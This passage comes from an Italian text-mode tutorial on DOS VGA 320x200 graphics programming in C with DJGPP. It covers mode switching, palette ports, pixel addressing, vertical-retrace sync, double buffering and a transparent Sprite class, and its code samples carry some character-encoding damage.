|  | 2    |-------------------------------------------------------------   |
|  '------'                                                                |
| PoichΦ alcune routine per le  operazioni grafiche necessitano di molta   |
| velocitα che non sempre  i costrutti del  linguaggio c sono  in  grado   |
| di   darci, conviene  ricorrere  all'assembler.  Non  staremo  qui  a    |
| spiegare  come  e  dove  utilizzare l'assembler,   basti  solo  sapere   |
| che si  pu≥ fare  meglio  nel caso  le  vostre esigenze lo richiedano.   |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   LA MODALiTA' GRAFiCA                                         |
|  | 3    |-------------------------------------------------------------   |
|  '------'                                                                |
| Prima di poter cominciare a disegnare pixel sullo schermo Φ necessario   |
| attivare la modalitα grafica.                                            |
| PoichΦ quando  scriviamo un  programma per  console ci  troviamo nella   |
| modalitα testo,  dobbiamo richiamare   un  interrupt   del bios    per   |
| dire al    controller grafico quale modalitα grafica vogliamo attivare   |
| ed utilizzare.                                                           |
| Essere in modalitα  grafica significa che  possiamo agire sui  singoli   |
| pixel  dello schermo.                                                    |
| La vga  ha diversi    tipi di  modalitα grafiche  con  risoluzioni   e   |
| numero  di colori  diversi:   in  questa   guida  noi   ci  riferiremo   |
| sempre alla   modalitα 320x200   a   256   colori  semplicemente   per   |
| il  fatto  che   Φ   la  modalitα  con  risoluzione   pi∙   alta   che   |
| ci   permette  di   utilizzare  il  maggior numero  di colori.           |
| Per curiositα,  vediamo anche  le altre  modalitα grafiche  supportate   |
| dalla vga:                                                               |
|                                                                          |
|                                                                          |
|        Risoluzione:    Colori:    Modalitα:                              |
|     -----------------------------------------------                      |
|         320x200         4           0x04                                 |
|         640x200         b/w         0x06                                 |
|         320x200         16          0x0d                                 |
|         640x200         16          0x0e                                 |
|         640x350         monoc.      0x0f                                 |
|         640x350         4           0x10                                 |
|         640x480         b/w         0x11                                 |
|         640x480         16          0x12                                 |
|         320x200         256         0x13                                 |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|     .---------------------------------------------------.                |
|     | RETTANGOLO DELLA CULTURA                           \               |
|     '-----------------------------------------------------'              |
|      A   questo   punto,   nasce   spontanea   una  domanda:   ma   la   |
|      1600x1200 a  16 milioni  di colori  che uso  per giocare  a Quake   |
|      Arena?   Questa  modalitα  e le altre  non sono supportate  dallo   |
|      standard vga...                                                     |
|      Nei computer attuali, il controller grafico utilizza lo  standard   |
|      SVGA. Lo svga  (Super Video Graphics  Array) Φ un'evoluzione  del   |
|      vga e  permette di  utilizzare risoluzioni  elevate e  un maggior   |
|      numero di colori.                                                   |
|      Rimane comunque  una compatibilitα  verso il  vga dei  controller   |
|      svga   che ci   permette  di   operare  come  se  ci   trovassimo   |
|      alle  prese con  un controller vga.                                 |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
| Vediamo  praticamente come  si  attiva  la modalitα  grafica.  Bisogna   |
| richiamare l'interrupt bios 10h,  quindi potremmo scrivere 2  righe in   |
| assembler, del tipo:                                                     |
|                                                                          |
|                                                                          |
|     mov al, 13h                                                          |
|     int 10h                                                              |
|                                                                          |
|                                                                          |
| Portato in una funzione del nostro programma C, diventa:                 |
|                                                                          |
|                                                                          |
|     void vgaOpen(){                                                      |
|         union REGS reg;                                                  |
|         reg.x.ax = 0x13;                                                 |
|         int86(0x10,«,«);                                                 |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Nulla vieta di usare l'asm inline:                                       |
|                                                                          |
|                                                                          |
|     void vgaOpen(){                                                      |
|         asm mov al, 13h                                                  |
|         asm int 10h                                                      |
|     }                                                                    |
|                                                                          |
|                                                                          |
| A questo   proposito  Φ   necessario  tenere    conto che   i  diversi   |
| compilatori gestiscono l'assembler inline in modo diverso  (il  watcom   |
| lo gestisce tramite le direttive 'pragma' mentre  il djgpp non  usa la   |
| sintassi dell'assembler Intel ma quella AT&T - bisogna quindi prestare   |
| attenzione a questo fatto).                                              |
| Tornando alla spiegazione, vediamo  la  funzione che, al  termine  del   |
| programma, ripristina la modalitα testuale:                              |
|                                                                          |
|                                                                          |
|     void vgaClose(){                                                     |
|         union REGS reg;                                                  |
|         reg.x.ax = 0x03;                                                 |
|         int86(0x10,«,«);                                                 |
|     }                                                                    |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   COLORi                                                       |
|  | 4    |-------------------------------------------------------------   |
|  '------'                                                                |
| Un pixel sullo schermo Φ  definito semplicemente come un colore.  Tale   |
| colore Φ un byte scritto nella  memoria video.                           |
| Il  byte  della  memoria   video  identifica  il  numero   del  colore   |
| memorizzato nell'hardware grafico. La scheda video contiene  i  valori   |
| di  rosso, verde  e  blu  per  ognuno  dei  256  colori  disponibili.    |
| L'insieme  dei 256  colori forma  una palette, la tavolozza.             |
|                                                                          |
| Per intenderci:                                                          |
|                                                                          |
|                                                                          |
|     colore  r   g   b                                                    |
|     ------------------                                                   |
|     0x01    63  0   63                                                   |
|     0x02    00  63  63                                                   |
|                                                                          |
|                                                                          |
| La  colonna  colore  contiene   il  codice  del  colore   (quello  che   |
| specificheremo  nelle  istruzioni  per  disegnare)  mentre  r,  g  e b   |
| contengono informazioni sul colore.                                      |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|     .---------------------------------------------------.                |
|     | RETTANGOLO DELLA CULTURA                           \               |
|     '-----------------------------------------------------'              |
|      I   colori  su  un   monitor,   come  in   un   televisore,  sono   |
|      ottenuti accostando tre   fosfori  dei  tre  colori  fondamentali   |
|      rosso,  verde   e blu  (RGB, dall'inglese  red -  green -  blue).   |
|      Agendo  sull'intensitα   della  luce     emanata   dai    cannoni   |
|      fotonici che   va  a   colpire i  fosfori  Φ  possibile  ottenere   |
|      un'infinitα   di sfumature  (sempre che  l'hardware lo permetta).   |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
| Le porte  hardware che  si utilizzano  per modificare  la palette  del   |
| controller  grafico  sono  2, la  0x3c8  che  specifica  quale  colore   |
| stiamo per  definire  e  la 0x3c9  che riceve i  valori di RGB  per il   |
| colore selezionato.                                                      |
|                                                                          |
| Supponiamo  di  voler  modificare  il    colore  16.  Per  prima cosa,   |
| scriviamo sulla 0x3c8 il numero del colore:                              |
|                                                                          |
|                                                                          |
|     outportb(0x3c8, 16);                                                 |
|                                                                          |
|                                                                          |
| Adesso, scriviamo sulla 0x3c9 i valori di RGB.                           |
|                                                                          |
|                                                                          |
|     outportb(0x3c9, r);                                                  |
|     outportb(0x3c9, g);                                                  |
|     outportb(0x3c9, b);                                                  |
|                                                                          |
|                                                                          |
| La porta  0x3c9 a  ogni scrittura  si incrementa  di 1, permettendo di   |
| inserire i  3 valori dei colori fondamentali.                            |
| Definiamo, quindi, una funzione che ci permetta di impostare i colori:   |
|                                                                          |
|                                                                          |
|     void setColor(char color, char r, char g, char b){                   |
|         outportb(0x3c8, color);                                          |
|         outportb(0x3c9, r);                                              |
|         outportb(0x3c9, g);                                              |
|         outportb(0x3c9, b);                                              |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Ricordo  che  colore Φ   un  byte, pertanto  Φ   possibile specificare   |
| un  valore compreso  tra  0:255,  mentre   r, g,   b   sono  valori di   |
| soli 6  bit e   possono assumere valori compresi tra 0:63.               |
| Quando  la  scrittura di  un    colore termina,  la  porta 0x3c8    si   |
| incrementa automaticamente  e punta  al colore  successivo.  Questa  Φ   |
| una   caratteristica interessante che  ci tornerα utile quando andremo   |
| a caricare palette di immagini salvate su file.                          |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   PiXEL                                                        |
|  | 5    |-------------------------------------------------------------   |
|  '------'                                                                |
| Bene, adesso che  sappiamo come  attivare  la modalitα grafica  e come   |
| funzionano i  colori, passiamo   a vedere  come si  individua un pixel   |
| sullo schermo.                                                           |
| Lo   schermo  pu≥   essere  visto   come  un   sistema  di riferimento   |
| cartesiano,  dove ogni  pixel Φ  individuato da una coppia  di  valori   |
| (x, y) che ne determinano  le sue coordinate.                            |
|                                                                          |
|                                                                          |
|                     |                                                    |
|                   - + - - > x                                            |
|                     |                                                    |
|                     |   .-----------------------.                        |
|                     V y |                       |                        |
|                         |                       |                        |
|                      yp _ _ _ _ . pixel         |                        |
|                         |       |               |                        |
|                         |       |               |                        |
|                         |       |               |                        |
|                         '-------|---------------' schermo                |
|                                 xp                                       |
|                                                                          |
|                                                                          |
| Immaginiamo adesso lo schermo come una matrice  di n*m byte (altro non   |
| Φ che  la memoria video).                                                |
| Se ogni byte rappresenta il colore del pixel, n equivale alla sua x  e   |
| m alla sua y.                                                            |
| Se vogliamo che il  pixel 10, 20 sia  rosso, andremo a mettere   nella   |
| matrice di posto [10][20] il  codice colore del  rosso. La  coordinata   |
| base  dello schermo   Φ (0; 0)  e che quindi  la coordinata massima  Φ   |
| (319; 199).                                                              |
| La coordinata (0; 0) Φ l'angolo sinistro alto dello schermo.             |
| Possiamo quindi dire che scrivendo:                                      |
|                                                                          |
|                                                                          |
|     vga[10][20] = rosso;                                                 |
|                                                                          |
|                                                                          |
| andremo a illuminare di rosso il pixel di coordinare x=10 e y=20.        |
| vga Φ   un puntatore   alla memoria  video, ma   vedremo pi∙ avanti in   |
| dettaglio.                                                               |
| In  teoria,   il   ragionamento    non   fa   una    piega,   ma    in   |
| pratica   il  compilatore  non   ci  lascia   utilizzare   la  memoria   |
| video  come  un    array bidimensionale.                                 |
| Possiamo aggirare il problema con un indirizzamento del genere:          |
|                                                                          |
|                                                                          |
|     vga[10+20*320] = rosso;                                              |
|                                                                          |
|                                                                          |
| In questo  modo otteniamo  lo stesso  risultato.                         |
| Ovviamente questa Φ  una scrittura riferita  al pixel (10,  20) su uno   |
| schermo largo 320 pixel.                                                 |
| In generale Φ:                                                           |
|                                                                          |
|                                                                          |
|     vga[x+y*larghezza] = colore;                                         |
|                                                                          |
|                                                                          |
| Riguardo  alla scrittura  sulla memoria video, sorgono alcuni problemi   |
| relativi alla velocitα  di calcolo   delle coordinate.                   |
| L'operazione di moltiplicazione y*320 all'interno dell'istruzione:       |
|                                                                          |
|                                                                          |
|     vga[x+y*320] = colore;                                               |
|                                                                          |
|                                                                          |
| non Φ molto veloce, quindi si preferisce sostituirla con:                |
|                                                                          |
|                                                                          |
|     vga[x+(y<<8)+(y<<6)] = rosso;                                        |
|                                                                          |
|                                                                          |
| Le  due  operazioni   di   shift  sono   pi∙  veloci   rispetto   alla   |
| moltiplicazione e  ci portano allo stesso risultato.                     |
| Tutto   ci≥ Φ   decisamente vero   e sensato   ma,  oggi   come oggi,    |
| considerata la potenza di calcolo  delle ultime cpu,  non ritengo  sia   |
| un  fattore rilevante   come poteva  esserlo su  un 286,  386 o  486.    |
| Comunque, onde evitare problemi...                                       |
|                                                                          |
| Si diceva che  ci occorre un  puntatore alla memoria  video per  poter   |
| agire sui pixel.                                                         |
| La  memoria video  parte  dall'indirizzo  0xa0000 ed  Φ un  buffer  di   |
| dimensioni variabili in  base  al modo  grafico.  Nel nostro  caso,  Φ   |
| un'area grande  320x200 byte = 64 kbyte.                                 |
| Definiamo adesso il puntatore:                                           |
|                                                                          |
|                                                                          |
|     unsigned char *vga = (unsigned char*)0xa0000                         |
|                                                                          |
|                                                                          |
| Lavorando  con  il  compilatore  DJGPP,   non  Φ  possibile   accedere   |
| direttamente  alla locazione 0xa000   con un  puntatore near   quale Φ   |
| un unsigned  char, pertanto Φ necessario  utilizzare questa scrittura:   |
|                                                                          |
|                                                                          |
|     unsigned char *vga;                                                  |
|     vga = (unsigned char*)(0xa0000+__djgpp_conventional_base);           |
|                                                                          |
|                                                                          |
| e chiamare la funzione:                                                  |
|                                                                          |
|                                                                          |
|     __djgpp_nearptr_enable();                                            |
|                                                                          |
|                                                                          |
| Definiamo una funzione che disegna pixel sullo schermo:                  |
|                                                                          |
|                                                                          |
|     void drawPixel(short x, short y, char color){                        |
|         vga[x+(y*320)] = color;                                          |
|     }                                                                    |
|                                                                          |
|                                                                          |
|                                                                          |
| L'esempio che segue colora tutto lo schermo di un colore:                |
|                                                                          |
|                                                                          |
|     #include                                                             |
|                                                                          |
|     void drawPixel(short x, short y, char color){                        |
|         vga[x+(y*320)] = color;                                          |
|     }                                                                    |
|                                                                          |
|     void main(){                                                         |
|         __djgpp_nearptr_enable();                                        |
|         unsigned char *vga;                                              |
|         vga = (unsigned char*)(0xa0000+__djgpp_conventional_base);       |
|                                                                          |
|         vgaOpen();                                                       |
|                                                                          |
|         for(int i=0; i<320; i++){                                        |
|             for(int j=0; j<200; j++) drawPixel(x, y, 0x88);              |
|         }                                                                |
|         getch();                                                         |
|                                                                          |
|         vgaClose();                                                      |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Cominciamo adesso a fare le prime ottimizzazioni...                      |
| E' possibile  evitare  di  nidificare  due  cicli   poichΦ  essendo la   |
| memoria video una sequenza  continua di byte Φ possibile ottenere   lo   |
| stesso risultato con:                                                    |
|                                                                          |
|                                                                          |
|     for(int i=0; i<320*200; i++) vga[i] = 0x88;                          |
|                                                                          |
|                                                                          |
| Quindi,     un'eventuale     cancellazione    dell'intero      schermo   |
| potrebbe  essere semplicemente:                                          |
|                                                                          |
|                                                                          |
|     for(int i=0; i<320*200; i++) vga[i] = NULL;                          |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   DiSEGNAMO!                                                   |
|  | 6    |-------------------------------------------------------------   |
|  '------'                                                                |
| Adesso che sappiamo come impostare un pixel, come attivare la modalitα   |
| grafica e anche come cambiare i colori, proviamo a disegnare  qualcosa   |
| sullo schermo.                                                           |
| Disegnamo un quadrato azzurro.                                           |
|                                                                          |
|                                                                          |
|     #include                                                             |
|                                                                          |
|     void vgaOpen(){                                                      |
|         union REGS reg;                                                  |
|         reg.x.ax = 0x13;                                                 |
|         int86(0x10,«,«);                                                 |
|     }                                                                    |
|     void vgaClose(){                                                     |
|         union REGS reg;                                                  |
|         reg.x.ax = 0x03;                                                 |
|         int86(0x10,«,«);                                                 |
|     }                                                                    |
|                                                                          |
|     unsigned char *vga;                                                  |
|     int x, y, x2, y2;                                                    |
|                                                                          |
|     void main(void){                                                     |
|         __djgpp_nearptr_enable();                                        |
|         vga = (unsigned char*)(0xa0000+__djgpp_conventional_base);       |
|                                                                          |
|         vgaOpen();                                                       |
|                                                                          |
|         x=20; y=20; x2=50; y2=50;                                        |
|                                                                          |
|         for(int i=x; i&lt;x2; i++){                                         |
|             for(int j=y; j&lt;y2; j++){                                     |
|                 vga[i+(j*320)] = 0x35;                                   |
|             }                                                            |
|         }                                                                |
|         getch();                                                         |
|                                                                          |
|         vgaClose();                                                      |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Una volta steso il codice  va compilato. Per chi utilizzasse  il DJGPP   |
| come ho consigliato, dal prompt del dos digiti:                          |
|                                                                          |
|                                                                          |
|     gpp sorgente.cpp -o eseguibile.exe                                   |
|                                                                          |
|                                                                          |
| e poi si lancia eseguibile.exe.                                          |
| Vediamo adesso come muovere il quadratino nello schermo.                 |
|                                                                          |
|                                                                          |
|     #include                                                             |
|                                                                          |
|     unsigned char *vga;                                                  |
|     int x, y, direction;                                                 |
|                                                                          |
|     void main(void){                                                     |
|         __djgpp_nearptr_enable();                                        |
|         vga = (unsigned char*)(0xa0000+__djgpp_conventional_base);       |
|                                                                          |
|         vgaOpen();                                                       |
|                                                                          |
|         x=20; y=20; direction=0x00;                                      |
|                                                                          |
|         while(!kbhit()){                                                 |
|             //disegna il quadrato                                        |
|             for(int i=x; i&lt;x+5; i++){                                    |
|                 for(int j=y; j&lt;y+5; j++){                                |
|                     vga[i+(j*320)] = 0x35;                               |
|                 }                                                        |
|             }                                                            |
|             //cancella lo schermo per ridisegnare un nuovo quadrato      |
|             for(int k=0; k<320*200; k++) vga[k] = 0x00;                  |
|             //calcola le coordinate dello spostamento                    |
|             if(x+5==319) direction=0x00;                                 |
|             if(x==0) direction=0xff;                                     |
|             if(direction==0xff) x++;                                     |
|             if(direction==0x00) x--;                                     |
|         }                                                                |
|         vgaClose();                                                      |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Un' orrendo esempio di animazione ma potete sbizzarrirvi come volete;-)  |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   SiNCRONiZZAZiONE                                             |
|  | 7    |-------------------------------------------------------------   |
|  '------'                                                                |
| Avrete   notato che   l'animazione del   quadratino fa   semplicemente   |
| schifo...   il  quadratino    Φ    appena     visibile    in   seguito   |
| all'eccessivo   sfarfall∞o dell'animazione.                              |
| Dobbiamo   tener   presente   che  lo   sfarfallio   compare    quando   |
| vado   ad aggiornare la memoria   video  mentre  il  chip  grafico non   |
| ha ancora   finito di   leggere  e    disegnare   su   schermo.    Per   |
| non    incorrere    in   questo inconveniente,    possiamo  andare   a   |
| testare   il   4░  bit     della   porta   0x3da  (controller    CRT     |
| -    hardware   incaricato   di  leggere   dalla    memoria    video e   |
| convertire in segnali   per il monitor) che  ci dice  se la  lettura Φ   |
| finita (=0) o se   stα  ancora lavorando (=1).                           |
| Potremmo introdurre  un  ciclo di  attesa  con l'istruzione:             |
|                                                                          |
|                                                                          |
|     while ((inportb(0x3da)&0x08)!=0);                                    |
|                                                                          |
|                                                                          |
| per≥   non  ci  basta  verificare  se  il  controller  ha  finito  di    |
| leggere   perchΦ  potrebbe stare  per  cominciare un  nuovo   ciclo di   |
| lettura, quindi la funzione  di sincronizzazione completa Φ:             |
|                                                                          |
|                                                                          |
|     void synchro(void){                                                  |
|         while ((inportb(0x3da)&0x08)!=0);                                |
|         while ((inportb(0x3da)&0x08)==0);                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
| e il codice ottimizzato per l'animazione del quadratino azzurro:         |
|                                                                          |
|                                                                          |
|         while(!kbhit()){                                                 |
|             synchro();                                                   |
|             for(int i=x; i&lt;x+5; i++){                                    |
|                 for(int j=y; j&lt;y+5; j++){                                |
|                     vga[i+(j*320)] = 0x35;                               |
|                 }                                                        |
|             }                                                            |
|             synchro();                                                   |
|             for(int k=0; k<320*200; k++) vga[k] = 0x00;                  |
|             if(x+5==319) direction=0x00;                                 |
|             if(x==0) direction=0xff;                                     |
|             if(direction==0xff) x+=2;                                    |
|             if(direction==0x00) x-=2;                                    |
|         }                                                                |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   DOPPiO BUFFERiNG                                             |
|  | 8    |-------------------------------------------------------------   |
|  '------'                                                                |
| Anche  se  ci   siamo   sincronizzati  con   il  controller   grafico,   |
| l'animazione non Φ molto "fluida" e sfarfalla  ancora. A questo punto,   |
| non ci rimane  che adottare  una delle  due soluzioni  applicabili       |
| per                                                                      |
| migliorare l'animazione: utilizzare il doppio buffering o il clipping.   |
|                                                                          |
| Il   doppio buffering   Φ una   tecnica che   consiste nell'andare   a   |
| disegnare   in un'area  di  memoria  che non  corrisponde  con  quella   |
| video  e  successivamente, quando  la scrittura  Φ stata   completata,   |
| andare  a copiare  il  contenuto   del secondo  buffer   sulla memoria   |
| video.                                                                   |
|                                                                          |
| Con  il  clipping   si va,  invece,   a  ridisegnare solo   l'area  di   |
| schermo  che necessita  di un  aggiornamento, lasciando  invariate  le   |
| parti 'statiche'. Il clipping  ha senso  quando l'area  da ridisegnare   |
| Φ solo una piccola  porzione  dello schermo e vi lascio  immaginare il   |
| perchΦ.  Conviene  applicarlo   unitamente al   doppio  buffering   (i   |
| risultati sono  pi∙  apprezzabili  se  li utilizziamo insieme).          |
|                                                                          |
| Per lavorare con il doppio buffering   Φ necessario andare a  definire   |
| un  buffer delle stesse dimensioni della memoria video, in questo caso   |
| 64 kbyte:                                                                |
|                                                                          |
|                                                                          |
|     unsigned char *doubleBuffer = (unsigned char *)malloc(320*200);      |
|                                                                          |
|                                                                          |
| Per disegnare un pixel, andremo a scrivere dapprima nel buffer da  noi   |
| dichiarato e poi copiamo quest'ultimo nella memoria video:               |
|                                                                          |
|                                                                          |
|     doubleBuffer[x+y*320] = colore;                                      |
|     for(int i=0; i<320*200; i++) vga[i] = doubleBuffer[i];               |
|                                                                          |
|                                                                          |
| Per  quanto riguarda  lo  switch  dei buffer,  anzichΦ  utilizzare  un   |
| ciclo   come  proposto   sopra,    Φ   possibile    utilizzare  alcune   |
| funzioni   del  c,  quali dosmemput e movedata:                          |
|                                                                          |
|                                                                          |
|     dosmemput(doubleBuffer, 320*200, vga);                               |
|     movedata(_my_ds(), doubleBuffer, _dos_ds, vga, 320*200);             |
|                                                                          |
|                                                                          |
| Le due funzioni  per la  copia  di buffer in  memoria  sono molto  pi∙   |
| veloci di  un normale ciclo  per  il  fatto che,  sfruttando appieno i   |
| registri della cpu,  lo spostamento  avviene  a pi∙ di soli 8 bit  per   |
| volta.                                                                   |
| La scelta dell'una  o dell'altra   soluzione dipende  da che  tipo  di   |
| prestazioni ci   interessano.  Per   semplici  programmini  di  prova,   |
| va  benissimo  anche la copia mediante un ciclo.                         |
| Scriviamo adesso una funzione che effettui lo switch:                    |
|                                                                          |
|                                                                          |
|     void refresh(unsigned char *buffer){                                 |
|         for(int i=0; i<320*200; i++) vga[i] = buffer[i];                 |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Ed ecco la funzione per la stampa di pixel su un buffer:                 |
|                                                                          |
|                                                                          |
|     void drawPixel(short x, short y, char color, unsigned char *buff){   |
|         buff[x+(y<<8)+(y<<6)] = color;                                   |
|     }                                                                    |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   SPRiTE                                                       |
|  | 9    |-------------------------------------------------------------   |
|  '------'                                                                |
| Lo sprite Φ  un oggetto grafico  che compone la  nostra immagine sullo   |
| schermo.   Se  pensiamo   ai    vecchi    videogiochi  bidimensionali,   |
| possiamo  dire   che   i personaggi, lo sfondo, i vari oggetti e  cos∞   |
| via sono degli sprites.                                                  |
| Lo    sprite   Φ   un    buffer    di   memoria    delle    dimensioni   |
| dell'immagine  contenente l'immagine  stessa che  andrα poi  disegnata   |
| sullo schermo.                                                           |
| Risulta  comodo    utilizzare  utilizzare   le   classi   del  c   per   |
| implementare   gli   sprites,    cos∞   possiamo     definire   alcune   |
| funzioni al   suo interno  per lavorare sullo schermo.                   |
| Si utilizzano   gli sprite   per semplificare   notevolmente anche  le   |
| pi∙  semplici  operazioni  sullo  schermo,  in  seguito  capirete   il   |
| perchΦ...                                                                |
|                                                                          |
|                                                                          |
|                                                                          |
|    .'                                                                    |
|    |  piccola parentesi sulle classi...                                  |
|    '.                                                                    |
|                                                                          |
| Vediamo prima come  si utilizza uno  sprite e poi  come lo  definiamo.   |
| Per prima cosa,  per  utilizzare  uno  sprite   ci  serve un puntatore   |
| allo  sprite che dichiariamo:                                            |
|                                                                          |
|                                                                          |
|     Sprite *oggetto;                                                     |
|                                                                          |
|                                                                          |
| Successivamente creiamo l'oggetto:                                       |
|                                                                          |
|                                                                          |
|     oggetto = new Sprite(x, y);                                          |
|                                                                          |
|                                                                          |
| L'operatore new  ci  permette  di allocare  gli oggetti dinamicamente,   |
| proprio come la malloc fa  per  la memoria.                              |
| New chiama il costruttore della classe,  una funzione che ha lo stesso   |
| nome della classe. All'interno del costruttore allochiamo la memoria e   |
| inizializziamo alcuni parametri che ci occorrono.                        |
| Per  liberarci  di  un  oggetto  che  non  ci  serve  pi∙  utilizziamo   |
| l'operatore delete:                                                      |
|                                                                          |
|                                                                          |
|     delete oggetto;                                                      |
|                                                                          |
|                                                                          |
| Delete chiama il distruttore della classe Sprite che ha il compito  di   |
| deallocare la memoria occupata  dallo sprite stesso.                     |
|                                                                          |
|                                                                          |
|                                                                    '.    |
|                                          ...fine piccola parentesi  |    |
|                                                                    .'    |
|                                                                          |
|                                                                          |
| Adesso che sappiamo come si usa uno sprite, proviamo a costruirne uno.   |
| Un  primitivo  possibile esempio  di  classe per  uno  sprite potrebbe   |
| essere:                                                                  |
|                                                                          |
|                                                                          |
|     class Sprite{                                                        |
|         public:                                                          |
|             Sprite(int, int);                                            |
|             ~Sprite();                                                   |
|             void Paint(int, int, unsigned char *);                       |
|                                                                          |
|             unsigned char *image;                                        |
|             int width, height;                                           |
|     };                                                                   |
|                                                                          |
|                                                                          |
|                                                                          |
| Vediamo il costruttore. Ha l'unico  compito di allocare il buffer  per   |
| l'immagine e necessita di 2 parametri: le dimensioni dell'immagine.      |
|                                                                          |
|                                                                          |
|     Sprite::Sprite(int w, int h){                                        |
|         if((image = (unsigned char *)malloc(w*h))==NULL){                |
|             //impossibile allocare memoria per lo sprite                 |
|             return;                                                      |
|         }                                                                |
|         width = w;                                                       |
|         height = h;                                                      |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Abbiamo   anche  l'inizializzazione   delle  due   variabili  width  e   |
| height   che   ci  dicono   quanto   Φ  grande   lo   sprite.   Queste   |
| informazioni ci  torneranno utili  per alcune  operazioni da  compiere   |
| sugli sprite.                                                            |
| Il  distruttore  deve   semplicemente restituire al  sistema operativo   |
| la memoria allocata, quindi sarα:                                        |
|                                                                          |
|                                                                          |
|     Sprite::~Sprite(){                                                   |
|         if(image!=NULL) free(image);                                     |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Passiamo a vedere una  funzione  strettamente legata allo  scopo dello   |
| sprite: il disegno dell'immagine  contenuta nello  sprite.               |
| La  funzione  in  questione Φ la Paint,  che  si occupa  di  disegnare   |
| lo  sprite  nel  buffer  per   poi   disegnarla  sullo   schermo.  Gli   |
| passiamo le  coordinate di inizio  dell'  immagine e  il puntatore  al   |
| doppio buffer:                                                           |
|                                                                          |
|                                                                          |
|     void Sprite::Paint(int xx, int yy, unsigned char *buffer){           |
|         int i, j, buff = 0;                                              |
|         for(j=yy; j&lt;yy+height; j++){                                     |
|             for(i=xx; i&lt;xx+width; i++){                                  |
|                 buffer[i+(j<<8)+(j<<6)] = image[buff++];                 |
|             }                                                            |
|         }                                                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Adesso  abbiamo   il  nostro   sprite  pronto  per essere  utilizzato:   |
| dobbiamo solo inserire  l'immagine.                                      |
| Riutilizziamo la  funzione  vista  sopra per   disegnare un  pixel  in   |
| un  buffer e la modifichiamo   per  renderla in grado di  disegnare in   |
| uno sprite.                                                              |
| Ci    basta    sostituire  il  puntatore    al   buffer     con     un   |
| puntatore    a  sprite.   AnzichΦ    disegnare direttamente  nell'area   |
| specificata dal  puntatore, andiamo a disegnare nel  campo image.        |
|                                                                          |
|                                                                          |
|     void drawPixel(short x, short y, char color, Sprite *sptr){          |
|         sptr->image[x+(y*sptr->width)] = color;                          |
|     }                                                                    |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   SPRiTE iN TRASPARENZA                                        |
|  | 10   |-------------------------------------------------------------   |
|  '------'                                                                |
| Consideriamo adesso  un aspetto  del quale  non abbiamo  tenuto  conto   |
| durante la scrittura  della funzione  Paint  della classe  Sprite.  La   |
| funzione   che  abbiamo scritto  poco sopra   non  tiene   conto   del   |
| fatto  che  in un'immagine ci  sono alcune  parti che vanno  disegnate   |
| e alcune no.                                                             |
| Se    vogliamo  realizzare  un   personaggio   che si   muove  su  uno   |
| sfondo  dovremo disegnare solo  la  parte dello sprite  che ritrae  il   |
| personaggio  e  non   anche   il  resto  dello    sprite    altrimenti   |
| l'effetto che   avremo sarα  di  un rettangolo nero  con   all'interno   |
| la  sagoma del  personaggio.                                             |
| E'  necessario modificare la funzione in questo modo:                    |
|                                                                          |
|                                                                          |
|     void Sprite::Paint(int xx, int yy, unsigned char *buffer){           |
|         int i, j, buff = 0;                                              |
|         for(j=yy, i=xx; j&lt;yy+height; j++, i=xx){                         |
|             while(i&lt;xx+width){                                           |
|                 if(image[buff]!=NULL)                                    |
|                     buffer[i+(j<<8)+(j<<6)] = image[buff];               |
|                 buff++;                                                  |
|                 i++;                                                     |
|             }                                                            |
|         }                                                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
|                                                                          |
| Decidiamo   che il   colore 0x00   (NULL) Φ   quello che   ci da   la    |
| trasparenza.  Ci basterα saltare le  parti riempite a  NULL e stampare   |
| quelle che  contengono la nostra immagine.                               |
| Risulta   pi∙   comodo,  per≥,   definire   dinamicamente   il  colore   |
| che   Φ  da considerarsi trasparente  con una  piccola aggiunta   alla   |
| classe  sprite di  una variabile:                                        |
|                                                                          |
|                                                                          |
|     char transparency;                                                   |
|                                                                          |
|                                                                          |
| e una modifica alla Paint:                                               |
|                                                                          |
|                                                                          |
|     void Sprite::Paint(int xx, int yy, unsigned char *buffer){           |
|         int i, j, buff = 0;                                              |
|         for(j=yy, i=xx; j&lt;yy+height; j++, i=xx){                         |
|             while(i&lt;xx+width){                                           |
|                 if(image[buff]!=transparency){  //<-- trasparenza        |
|                     buffer[i+(j<<8)+(j<<6)] = image[buff];               |
|                 }                                                        |
|                 buff++;                                                  |
|                 i++;                                                     |
|             }                                                            |
|         }                                                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Potrebbe per≥  presentarsi la  necessitα di  utilizzare tutti  e 256 i   |
| colori   messi  a  disposizione  senza  effettuare   alcuna  stampa in   |
| trasparenza.  Decidiamo allora  che: se il   colore di trasparenza   Φ   |
| NULL non  bisogna considerare  alcun  colore come trasparenza,  mentre   |
| se Φ qualunque  altro valore questo  Φ da considerarsi trasparente.      |
| La funzione finale Φ dunque:                                             |
|                                                                          |
